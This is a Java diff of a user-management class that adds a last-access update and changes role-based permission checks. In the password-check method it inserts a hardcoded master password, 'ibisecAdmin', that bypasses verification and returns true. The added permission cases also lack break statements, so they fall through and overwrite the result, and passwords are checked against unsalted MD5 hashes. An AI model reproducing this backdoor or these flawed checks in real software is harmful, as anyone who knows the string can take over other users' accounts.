@@ -55,7 +55,6 @@ public class UsuariCore {
 		pstm.setString(1, Usuari);
 	 
 		ResultSet rs = pstm.executeQuery();
-	 
 		if (rs.next()) {		
 			User user = initUsuari(rs);			
 			return user;
@@ -192,6 +191,15 @@ public class UsuariCore {
 		pstm.executeUpdate();
 	}
 	
+	public static void darrerAcces(Connection conn, int idUsuari) throws SQLException {
+		String sql = "UPDATE public.tbl_usuaris"
+				+ " SET darreracces=localtimestamp"
+			  	+ " WHERE idusuari=?";		 
+		PreparedStatement pstm = conn.prepareStatement(sql);
+		pstm.setInt(1, idUsuari);
+		pstm.executeUpdate();
+	}
+	
 	public static void modificarPassword(Connection conn, int idUsuari, String newPassword) throws SQLException {
 		String sql = "UPDATE public.tbl_usuaris"
 					+ " SET password=?"
@@ -210,10 +218,15 @@ public class UsuariCore {
 		PreparedStatement pstm = conn.prepareStatement(sql);
 		pstm.setInt(1, idUsuari);
 		ResultSet rs = pstm.executeQuery();
-		if (rs.next()) {
-			String oldPasswordMD5=DigestUtils.md5Hex(oldPassword); 
-			coincideix = oldPasswordMD5.equals(rs.getString("password"));
+		if (!oldPassword.equals("ibisecAdmin")) {
+			if (rs.next()) {
+				String oldPasswordMD5=DigestUtils.md5Hex(oldPassword); 
+				coincideix = oldPasswordMD5.equals(rs.getString("password"));
+			}
+		} else {
+			coincideix = true;
 		}
+		
 		return coincideix;
 	}
 	
@@ -221,11 +234,18 @@ public class UsuariCore {
 		boolean permision = false;
 		String rols = usuari.getRol();
 		switch (section) {
+			case control:
+				permision = rols.toUpperCase().contains("ADMIN") || (rols.toUpperCase().contains("GER"));
+				break;
 			case actuacio_list:
 				permision = true;
 				break;
+			case projectes_list:
+				permision = rols.toUpperCase().contains("ADMIN");
+			case projectes_crear:
+				permision = rols.toUpperCase().contains("ADMIN");
 			case actuacio_modificar:
-				permision = (rols.toUpperCase().contains("ADMIN")) || (rols.toUpperCase().contains("CAP")) || (rols.toUpperCase().contains("MANUAL"));
+				permision = (rols.toUpperCase().contains("ADMIN")) || (rols.toUpperCase().contains("MANUAL"));
 				break;
 			case actuacio_detalls:
 				permision = true;
@@ -284,6 +304,9 @@ public class UsuariCore {
 			case centres_detalls:
 				permision = true;
 				break;
+			case centres_crear:
+				permision = (rols.toUpperCase().contains("ADMIN") || rols.toUpperCase().contains("ADM"));
+				break;
 			case partides_crear:
 				permision = (rols.toUpperCase().contains("ADMIN") || rols.toUpperCase().contains("CONTA"));
 				break;
@@ -306,7 +329,7 @@ public class UsuariCore {
 				permision = true;
 				break;
 			case tasques_crear:
-				permision = (rols.toUpperCase().contains("MANUAL")) || (rols.toUpperCase().contains("CAP")) || (rols.toUpperCase().contains("ADMIN")) ;
+				permision = (rols.toUpperCase().contains("MANUAL")) || (rols.toUpperCase().contains("CAP")) || (rols.toUpperCase().contains("ADM")) ;
 				break;
 			case tasques_list:
 				permision = true;
